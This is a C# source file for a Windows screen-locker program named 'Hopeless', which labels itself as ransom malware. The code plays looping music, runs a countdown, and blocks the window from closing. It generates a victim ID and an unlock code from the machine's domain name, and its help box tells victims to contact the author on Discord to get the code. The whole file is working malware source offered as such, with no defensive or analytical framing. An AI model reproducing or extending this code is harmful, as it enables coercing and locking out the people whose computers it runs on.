using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Media;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Hopless
{
    public partial class Hopeless : Form
    {
        const string caractCode = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        const string caractID = "ABCDEF234567";
        string codeKey;
        string idUser;
        
        
        int time = 2000;

        public Hopeless()
        {
            InitializeComponent();
        }

        SoundPlayer music;

        private void Hopeless_Load(object sender, EventArgs e)
        {
            using (var fs = Properties.Resources.music)
            {
                music = new SoundPlayer(fs);
                music.PlayLooping();
            }
            txtTimer.Text = time.ToString();
            countdown.Start();
            int userIdHash = Environment.UserDomainName.GetHashCode();
            Random r = new Random(userIdHash);

            StringBuilder id = new StringBuilder();

            for (int i = 0; i < caractID.Length; i++)
            {
                id.Append(caractID[r.Next(caractID.Length)]);
            }
            idUser = id.ToString();
            txtIdUser.Text = idUser;
            int idHash = idUser.GetHashCode();

            Random c = new Random(idHash);

            StringBuilder code = new StringBuilder();
            for (int i = 0; i < 30; i++)
            {
                code.Append(caractCode[c.Next(caractCode.Length)]);
            }

            codeKey = code.ToString();
            

        }

        private void brCheckCode_Click(object sender, EventArgs e)
        {
            if (txtCode.Text != codeKey)
            {
                MessageBox.Show("INCORRECT CODE! TRY AGIN!", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            else
            {
                MessageBox.Show("YOUR CODE HAS BEEN VERIFIED SUCCESSFULLY! YOUR COMPUTER HAS BEEN RESTORED!\r\n\r\nSEE YOU NEXT TIME ( ;", "CONGRATULATIONS!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                //Desinfection
                DesinfectionCore.Desinfection();
            }
        }

        private void countdown_Tick(object sender, EventArgs e)
        {
            txtTimer.Text = time.ToString();
            time--;
            if (time <= 0)
            {
                countdown.Stop();
                MessageBox.Show("TIME OUT! RIP", "HAHAHA", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void btInfo_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Malware created by Waguinho 2k02.\r\n\r\nType: Ransom Screen Locker\r\n\r\nLanguage: C#", "INFO", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
            
        }

        private void btHelp_Click(object sender, EventArgs e)
        {
            MessageBox.Show("TO ACCESS THE CODE, CONTACT THE CREATOR OF THE MALWARE THROUGH HIS DISCORD: Wagnao5617.\r\n\r\nTHERE YOU WILL PROVIDE YOUR ID TO RECEIVE THE UNLOCKING CODE.", "HELP", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void Hopeless_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }
    }
}
